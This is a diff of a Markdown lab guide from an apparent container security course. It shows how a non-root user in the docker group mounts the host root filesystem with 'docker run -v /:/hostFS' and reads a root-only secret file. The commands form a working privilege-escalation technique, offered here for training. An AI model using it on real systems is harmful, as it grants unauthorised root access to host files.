@@ -1,144 +1,140 @@
 ## Authentication Attacks against Host
 
-###### A `non-root user` with access to docker can gain access to root filesystem of the host machine.
+###### A `non-root user` with access to docker can `gain access to root filesystem of the host machine` by using a feature of docker called `Volume Expose`. 
+
+###### In this attack, a `non-root` user can launch a container by using the `-v /:/hostFS` flag to mount the entire host file-system to the container launched. Changes made to the mounted file-system in the container reflects on the host file-system as well.
+
 
 ##### Step 1:
 
 * Open Terminal
 
-	![](img/Open-Terminal.png)
+![](img/Open-Terminal.png)
+
 
 ##### Step 2:
 
-*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host`
+* Run `whoami` to confirm that you are the `root` user.
+    
+```commandline
+root@we45:~# whoami
+root
+root@we45:~#
+```
 
-    ```commandline
-    cd /home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host
-    ```
+* Run `sudo su` to become root user, if you are NOT the `root` user already
+
+```commandline
+we45@we45:~# sudo su
+root@we45:~#
+```
+
 
 ##### Step 3:
 
-* Run `sudo su` to become root user.
+* Create a `secret.txt` file in the `/root/` directory, write some secret in it and save the file.
 
-    ```commandline
-      root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su
-      root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
-    ```
+```commandline
+root@we45:~# touch /root/secret.txt
+root@we45:~# 
+root@we45:~# mousepad /root/secret.txt
+```
+
+
+###### A `non-user` by default does not have access to docker.
+
+
 ##### Step 4:
 
-* Create a `secret.txt` file inside `/root/` directory.
+* Give `we45` user access to `docker`.
 
-    ```commandline
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# touch /root/secret.txt
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
-    ```
-##### Step 5:
+```commandline
+root@we45:~# usermod -aG docker we45
+root@we45:~#
+```
 
-* Open `secret.txt` and write some secret in it.
+* `Note`: Close and re-open the terminal for changes to take effect. It might be necessary to logout and log back in.
 
-    **Note:** 
-    1. `esc+i` to insert character into the file,
-    2. `esc+:+wq` to save and exit from the file.
 
-    ```commandline
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# vim /root/secret.txt
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
-    ```
+##### Step 5: 
+  
+* Run `sudo su we45` to login as a normal user.
+
+```commandline
+root@we45:~# sudo su we45
+we45@we45:~$
+```
     
-        
+* Check if the user `we45` has access to `docker` by running `docker images` and `docker ps`
+
+```commandline
+we45@we45:~$ docker images
+we45@we45:~$ docker ps
+```
+
+
 ##### Step 6: 
   
-* Run `sudo su user` login as a normal user.
+* Run `cat /root/secret.txt` read the content of `secret.txt` file that was created by `root` user.
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su user
-    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$
-    ```
+```commandline
+we45@we45:~$ cat /root/secret.txt
+cat: /root/secret.txt: Permission denied
+```
 
-##### Step 7: 
-  
-* Run `cat /root/secret.txt` read the content of secret.txt file.
+* Since the user does not have `root` privileges, permission to read/write the file will be denied
 
-    ```commandline
-    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ cat /root/secret.txt
-    cat: /root/secret.txt: Permission denied
-    ```
+
+##### Step 7:
+
+* Run `docker run -ti --rm -v /:/hostFS/ alpine` as `we45`(non-root user)
+
+```commandline
+we45@we45:~$ docker run -ti -v /:/hostFS/ alpine
+/ #     
+```
+    
+* By running this, a `non-root user` has mounted the host Filesystem to the docker container which the user has access to.
+
 
 ##### Step 8:
 
-* Run `exit` to exit as a normal user
+* Run `cd /hostFS/root/` to access the mounted host directory. Run `ls` to check the secret.txt file inside a container.
 
-    ```commandline
-    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ exit
-    exit
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# 
-    ```
+```commandline
+/ # cd /hostFS/root/
+/hostFS/root # 
+/hostFS/root # ls
+secret.txt
+```
 
-##### Step 9: 
-* Run `docker run -ti --rm -v /:/hostFS/ alpine` as `docker-user`(non-root user)
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# docker run -ti -v /:/hostFS/ alpine
-    / #     
-    ```
-    
-##### Step 10:
-
-* Run `cd /hostFS/root/` to access the toot directory.
-
-    ```commandline
-    / # cd /hostFS/root/
-    /hostFS/root # 
-    ```
-    
-##### Step 11:  
-
-* Run `ls` to check the secret.txt file inside a container.
-
-    ```commandline
-    /hostFS/root # ls
-    secret.txt
-    ``` 
-    
-##### Step 12:
+##### Step 9:
 
 * Run `cat secret.txt` to view the content of the file.
 
 ```commandline
 /hostFS/root # cat secret.txt
 secret
-
 ``` 
 
-**Note** : Now the docker-user has the privilege to view the root user data.
+###### Now, the `non-root user` has the privilege to view the root user data. Changes made to the file in the container will be reflected on the Host Filesystem as well.
 
 
-##### Step 13:
+##### Step 10:
 
 * Run `exit` to exit from the container.
 
-    ```commandline
-    /hostFS/root # exit
-    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
-    ```
+```commandline
+/hostFS/root # exit
+we45@we45:~$
+```
 
-##### Step 14:
 
-* Run `clean-docker` to stop all containers.  
+##### Stop all running docker containers
 
-    ```commandline
-    (venv)root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# clean-docker
-    92200af86b18
-    ca94dab2d52e
-    92200af86b18
-    34c4adcf326d
-    86cd73d03ef1
-    ca94dab2d52e
-    "docker rmi" requires at least 1 argument.
-    See 'docker rmi --help'.
-    
-    Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]
-    
-    Remove one or more images
-    
-    ```
+* Run `clean-docker` to stop all the containers
+
+```commandline
+root@we45:~$ clean-docker
+```
